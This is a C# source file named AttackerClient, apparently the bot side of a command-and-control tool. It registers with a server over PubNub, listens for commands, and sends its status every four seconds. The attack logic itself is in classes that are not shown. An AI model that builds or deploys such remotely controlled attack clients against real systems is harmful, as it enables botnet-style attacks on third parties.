using AtackerDTO;
using AttackerCommon;
using ChannelController;
using PubnubApi;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Timers;

namespace AttackerClient
{
    class Program
    {
        static string SenderId;
        static ClientStatusType Status;
        static string Data;
        static Pubnub pubnub;
        const int SendStatusMessageInterval = 4000;

        static void Main(string[] args)
        {
            SenderId = Identity.CreateNewID();
            Status = ClientStatusType.Normal;
            Data = String.Empty;
            pubnub = ChannelHelper.InitializePubNubClient();

            //Client'ın bilgileri server ile paylaşılıyor
            ClientController.PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);

            //Mesajların alınması için listener yaratılıyor
            Listener listener = new Listener(pubnub);
            listener.AddListener(message =>
            {
                ClientController.HandleMessage(message, pubnub, SenderId, ref Status, ref Data);
                return true;
            });

            //Sunucuya durum bilgisi gönderilmesi için bir timer yaratılıyor
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Elapsed += Timer_Elapsed; ;
            timer.Interval = SendStatusMessageInterval;
            timer.Start();

            Console.ReadLine();
        }

        private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            ClientController.PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);
        }
    }
}
